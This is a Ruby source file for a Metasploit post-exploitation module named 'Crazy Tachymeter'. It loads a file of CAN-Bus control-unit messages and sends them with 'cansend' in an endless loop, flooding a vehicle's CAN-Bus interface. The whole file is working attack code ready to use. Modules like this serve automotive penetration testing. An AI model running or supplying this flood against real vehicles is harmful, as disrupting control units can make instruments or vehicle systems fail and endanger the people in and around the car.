##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Post

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Crazy Tachymeter',
      'Description'    => %q{
        With this tool you can flood the CAN-Bus.
        Just pass a file.txt with the control unit map.
      },
      'Author'         => ['Pietro Biondi <pietro.biondi94@gmail.com>'],
      'DisclosureDate' => 'May 18 2018',
      'License'        => MSF_LICENSE
      )
    )
    register_options([
      OptString.new('INTERFACE', [true, 'Interface of CAN-Bus', 'vcan0']),
      OptString.new('FILEMAP', [true, 'Path to FILEMAP', ::File.join(Msf::Config.data_directory, 'wordlists', 'controlUnitMapCanBus.txt')])
    ])
  end

  def run
    print_status(' -- OPENING CONTROL UNIT MAP --')
    lines = []
    f = File.open(datastore['FILEMAP'], "rb")
    f.each_line do |line|
      lines.push(line.strip)
    end
    f.close
    print_status(' -- Flooding -- ')
    while 1
      lines.each{
        |e|
        cmd = "cansend #{datastore['INTERFACE']} #{e}"
        cmd_exec(cmd)
      }
    end
  end
end
